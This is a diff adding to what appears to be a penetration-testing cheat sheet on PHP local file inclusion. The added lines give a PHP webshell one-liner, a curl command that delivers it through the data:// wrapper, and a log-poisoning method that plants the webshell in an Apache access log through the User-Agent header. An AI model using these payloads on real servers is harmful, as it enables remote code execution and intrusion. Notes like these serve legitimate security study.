@@ -38,6 +38,29 @@ After finding a LFI, we can try to exploit it by getting the NETNTLMv2 hash by u
 
 We can do this because even if allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
 
+If allow_url_include is set to on in php.ini, we can send a webshell over the data php wrapper:
+
+```shell
+echo '<?php system($_GET["cmd"]); ?>' | base64
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+```
+
+## Log poisoning
+
+If we can include some log files, we can try to poison them by understanding what the logs are logging, and send some php so it is interpreted when the log file is shown.
+
+For example, if the log contains the user agent, we can send 
+
+```shell
+<?php system($_GET['cmd']); ?>
+```
+
+as the user agent header and then do
+
+Get /index.php?language=/var/log/apache2/access.log&cmd=id
+
 ## Interesting files to disclose - Linux
 
 /proc/self/cmdline
